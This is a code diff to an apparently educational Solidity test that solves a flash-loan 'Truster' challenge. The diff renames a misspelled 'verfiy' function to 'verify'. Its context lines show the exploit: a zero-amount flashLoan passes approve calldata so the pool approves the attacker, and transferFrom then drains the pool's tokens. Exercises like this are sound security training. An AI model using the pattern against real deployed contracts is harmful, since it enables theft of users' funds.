@@ -38,10 +38,10 @@ contract Truster is Test {
         trusterLenderPool.flashLoan(0, address(attacker), address(dvt), approve_func_sign);
         dvt.transferFrom(address(trusterLenderPool), address(attacker), TOKENS_IN_POOL);
         vm.stopPrank();
-        verfiy();
+        verify();
     }
 
-    function verfiy() internal {
+    function verify() internal {
         assertEq(dvt.balanceOf(address(trusterLenderPool)), 0);
         assertEq(dvt.balanceOf(address(attacker)), TOKENS_IN_POOL);
         console.log(unicode"✅You got 1 million dvt token");
